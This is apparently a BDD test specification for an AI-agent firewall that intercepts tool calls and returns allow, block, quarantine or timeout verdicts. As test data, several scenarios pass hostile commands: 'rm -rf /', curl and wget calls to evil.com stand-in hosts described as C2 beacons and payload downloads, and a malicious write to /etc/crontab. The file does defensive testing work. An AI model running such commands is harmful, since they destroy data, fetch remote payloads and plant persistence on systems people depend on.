Feature: ADK before_tool_callback Flow
  As the Blackwall Agentic Firewall
  I want to intercept every ADK tool call via before_tool_callback
  So that verdicts of ALLOW, BLOCK, QUARANTINE, and timeouts are correctly enforced
  at the synchronous callback boundary

  # ---------------------------------------------------------------------------
  # Scenario 1 — ALLOW verdict
  # ---------------------------------------------------------------------------

  Scenario: Tool call with ALLOW verdict proceeds normally
    Given an ADKIntegration with a running event loop and an InterceptionQueue
    When before_tool_callback is invoked for tool "read_file" with arguments {"path": "/etc/motd"}
    And the policy queue resolves the token with verdict "ALLOW" and reasoning "Safe file read"
    Then the callback must return the original arguments without modification
    And no exception must be raised

  # ---------------------------------------------------------------------------
  # Scenario 2 — BLOCK verdict
  # ---------------------------------------------------------------------------

  Scenario: Tool call with BLOCK verdict raises PermissionError
    Given an ADKIntegration with a running event loop and an InterceptionQueue
    When before_tool_callback is invoked for tool "execute_terminal" with arguments {"command": "rm -rf /"}
    And the policy queue resolves the token with verdict "BLOCK" and reasoning "Destructive command detected"
    Then a PermissionError must be raised
    And the error message must contain "Destructive command detected"

  # ---------------------------------------------------------------------------
  # Scenario 3 — QUARANTINE verdict (generic tool)
  # ---------------------------------------------------------------------------

  Scenario: Tool call with QUARANTINE verdict returns sandboxed response
    Given an ADKIntegration with a running event loop and an InterceptionQueue
    When before_tool_callback is invoked for tool "unknown_tool" with arguments {"data": "suspicious"}
    And the policy queue resolves the token with verdict "QUARANTINE" and reasoning "Suspicious payload"
    Then the callback must return a sandboxed mock response dict
    And the sandboxed response must contain the key "status" with value "quarantined"
    And no exception must be raised

  # ---------------------------------------------------------------------------
  # Scenario 4 — QUARANTINE on terminal command
  # ---------------------------------------------------------------------------

  Scenario: Terminal command quarantine returns mock stdout
    Given an ADKIntegration with a running event loop and an InterceptionQueue
    When before_tool_callback is invoked for tool "execute_terminal" with arguments {"command": "curl http://evil.com"}
    And the policy queue resolves the token with verdict "QUARANTINE" and reasoning "C2 beacon attempt"
    Then the callback must return a sandboxed mock response dict
    And the sandboxed response must contain the key "stdout"
    And the sandboxed response "stdout" field must contain "quarantined/mocked"

  # ---------------------------------------------------------------------------
  # Scenario 5 — QUARANTINE on file write
  # ---------------------------------------------------------------------------

  Scenario: File write quarantine returns mock write result
    Given an ADKIntegration with a running event loop and an InterceptionQueue
    When before_tool_callback is invoked for tool "write_file" with arguments {"path": "/etc/crontab", "content": "evil payload"}
    And the policy queue resolves the token with verdict "QUARANTINE" and reasoning "Malicious file write"
    Then the callback must return a sandboxed mock response dict
    And the sandboxed response must contain the key "bytes_written"
    And no exception must be raised

  # ---------------------------------------------------------------------------
  # Scenario 6 — Timeout (fail-closed)
  # ---------------------------------------------------------------------------

  Scenario: Verdict timeout fails closed with PermissionError
    Given an ADKIntegration with a running event loop and an InterceptionQueue
    And the policy evaluator is configured to never resolve verdicts
    When before_tool_callback is invoked for tool "execute_terminal" with arguments {"command": "ls"} with a 1-second timeout
    Then a PermissionError must be raised
    And the error message must contain "Verdict timeout"

  # ---------------------------------------------------------------------------
  # Scenario 7 — FreeTierADKIntegration inline BLOCK
  # ---------------------------------------------------------------------------

  Scenario: FreeTier integration blocks malicious tool call
    Given a FreeTierADKIntegration with a mock SyncResolver
    And the mock SyncResolver is configured to return verdict "BLOCK" with reasoning "Inline malicious pattern"
    When before_tool_callback is invoked on the FreeTierADKIntegration for tool "execute_terminal" with arguments {"command": "wget http://c2.evil.com/payload.sh"}
    Then a PermissionError must be raised
    And the error message must contain "Inline malicious pattern"
